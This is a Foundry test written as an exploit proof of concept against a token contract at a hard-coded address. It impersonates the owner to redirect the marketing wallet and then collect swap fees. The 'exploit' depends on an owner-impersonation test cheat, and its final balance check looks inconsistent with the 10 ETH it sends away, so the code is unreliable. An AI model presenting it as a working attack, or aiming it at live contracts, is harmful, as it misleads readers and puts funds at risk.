pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Elo {
    function owner() external view returns (address);
    function setMarketingWallet(address newWallet) external;
    function numTokensSellToAddToLiquidity() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x35207068e057a01861A654463c01B04cc111E760;
    address attacker = address(this);
    Elo target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Elo(TARGET);
        owner = target.owner();
        vm.label(owner, "Owner");
        vm.label(address(this), "Attacker");
        vm.label(TARGET, "Target Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Impersonate owner and redirect marketing wallet to attacker
        vm.startPrank(owner);
        target.setMarketingWallet(address(this));
        vm.stopPrank();

        // Step 2: Send ETH to contract to ensure addLiquidity succeeds
        // This ensures there's enough ETH for liquidity after marketing fees are taken
        (bool success, ) = TARGET.call{value: 10 ether}("");
        require(success, "ETH transfer failed");

        // Step 3: Hardcoded threshold value from contract source
        uint256 numTokensThreshold = 5000000000000000 * 10**9;

        // Step 4: Transfer tokens from owner to contract to build up balance
        vm.startPrank(owner);
        target.transfer(TARGET, numTokensThreshold * 2);
        vm.stopPrank();

        // Step 5: Get some tokens to attacker for the trigger transfer
        vm.startPrank(owner);
        target.transfer(address(this), numTokensThreshold);
        vm.stopPrank();

        // Step 6: Trigger a transfer that will cause swapAndLiquify to execute
        address recipient = address(0x1234567890123456789012345678901234567890);
        target.transfer(recipient, numTokensThreshold);

        // Step 7: Verify attacker received marketing fees in ETH
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have received marketing fees in ETH");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

